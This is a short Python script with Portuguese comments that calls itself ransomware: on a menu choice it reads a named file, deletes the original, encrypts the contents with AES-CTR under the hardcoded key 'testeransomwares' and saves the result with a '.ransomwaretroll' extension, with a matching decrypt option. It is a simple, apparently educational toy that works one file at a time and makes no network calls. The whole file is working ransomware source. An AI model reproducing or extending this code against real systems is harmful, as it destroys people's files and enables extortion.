import os
import pyaes

def encrypt_file(file_name, key):
	# abrir o arquivo a ser criptografado
	with open(file_name, "rb") as file:
		file_data = file.read()

	# remover o arquivo original
	os.remove(file_name)

	# inicializar o AES com a chave
	aes = pyaes.AESModeOfOperationCTR(key)

	# criptografar o arquivo
	crypto_data = aes.encrypt(file_data)

	# salvar o arquivo criptografado
	new_file_name = file_name + ".ransomwaretroll"
	with open(new_file_name, 'wb') as new_file:
		new_file.write(crypto_data)

	print(f"Arquivo {file_name} criptografado com sucesso!")

def decrypt_file(file_name, key):
	# abrir o arquivo criptografado
	with open(file_name, "rb") as file:
		file_data = file.read()

	# inicializar o AES com a chave
	aes = pyaes.AESModeOfOperationCTR(key)
	decrypt_data = aes.decrypt(file_data)

	# remover o arquivo criptografado
	os.remove(file_name)

	# criar o arquivo descriptografado
	original_file_name = file_name.replace(".ransomwaretroll", "")
	with open(original_file_name, "wb") as new_file:
		new_file.write(decrypt_data)

	print(f"Arquivo {original_file_name} descriptografado com sucesso!")

def main():
	key = b"testeransomwares"
	while True:
		print("Menu:")
		print("1. Criptografar arquivo")
		print("2. Descriptografar arquivo")
		print("3. Sair")
		choice = input("Escolha uma opção: ")

		if choice == '1':
			file_name = input("Digite o nome do arquivo a ser criptografado: ")
			encrypt_file(file_name, key)
		elif choice == '2':
			file_name = input("Digite o nome do arquivo a ser descriptografado: ")
			decrypt_file(file_name, key)
		elif choice == '3':
			break
		else:
			print("Opção inválida, tente novamente.")

if __name__ == "__main__":
	main()